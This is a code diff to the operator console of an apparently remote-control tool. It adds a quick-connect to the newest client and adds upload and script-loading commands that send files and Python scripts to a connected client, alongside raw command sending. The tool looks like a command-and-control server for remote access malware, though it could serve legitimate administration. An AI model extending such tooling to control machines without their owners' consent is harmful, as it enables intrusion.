@@ -1,12 +1,15 @@
+import glob
 import os
+import shlex
 import sys
 
-sys.path.append(os.path.dirname(os.path.dirname(os.path.realpath(__file__))))
+ROOT_DIR = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))
+sys.path.append(ROOT_DIR)
 
 import threading
 
 from core.server import Server
-from util.common_util import parse
+from util.common_util import parse, scan_args
 from config.server import SOCKET_ADDR
 
 
@@ -22,12 +25,15 @@ def accept_commands():
             command = input('flc> ')
             if not command:
                 continue
+            # 退出服务端
             elif command in ['quit', 'exit']:
                 server.socket.close()
                 sys.exit(0)
+            # 查看客户端列表
             elif command == 'list':
                 server.test_connections()
                 list_connections()
+            # 连接到客户端
             elif 'select' in command:
                 server.test_connections()
                 connection = None
@@ -35,6 +41,16 @@ def accept_commands():
                     connection = server.connections[int(command.replace('select', ''))]
                 except (ValueError, IndexError):
                     print('[-] Not a valid selection')
+                if connection is not None:
+                    open_connection(connection)
+            # 快速连接到最近上线的客户端
+            elif command == 'q':
+                server.test_connections()
+                connection = None
+                try:
+                    connection = server.connections[len(server.connections) - 1]
+                except IndexError:
+                    print('[-] No connection at this time')
                 if connection is not None:
                     open_connection(connection)
             else:
@@ -60,19 +76,17 @@ def open_connection(connection):
     while True:
         try:
             command = input(cwd + '> ')
+            functions = {'upload': upload, 'load': load}
             if not command:
                 continue
+            name, arg = parse(command)
             if command in ['quit', 'exit']:
                 break
-            if command == 'kill':
+            elif command == 'kill':
                 connection.send_command(command)
                 break
-            name, arg = parse(command)
-            if name == 'upload':
-                if os.path.isfile(arg):
-                    connection.send_file(arg)
-                else:
-                    print('[-] File does not exist')
+            elif name in functions:
+                if not functions[name](arg, connection):
                     continue
             else:
                 connection.send_command(command)
@@ -82,6 +96,34 @@ def open_connection(connection):
         except ConnectionResetError:
             print('[-] Connection closed')
             break
+        except Exception as e:
+            print('[-] {}'.format(e))
+
+
+# 上传文件
+def upload(arg, conn):
+    if os.path.isfile(arg):
+        conn.send_file(arg)
+        return 1
+    else:
+        print('[-] File does not exist')
+        return 0
+
+
+# 加载脚本
+def load(arg, conn):
+    script_dir = os.path.join(ROOT_DIR, 'script')
+    if not arg:
+        for file in glob.iglob(os.path.join(script_dir, '**/*.py'), recursive=True):
+            print(os.path.relpath(file, script_dir))
+        return 0
+    arg = shlex.split(arg)
+    script_name = os.path.join(script_dir, arg[0])
+    if not os.path.isfile(script_name):
+        print('[-] File does not exist: {}'.format(script_name))
+        return 0
+    conn.send_script(script_name, scan_args(arg[1:]))
+    return 1
 
 
 if __name__ == '__main__':
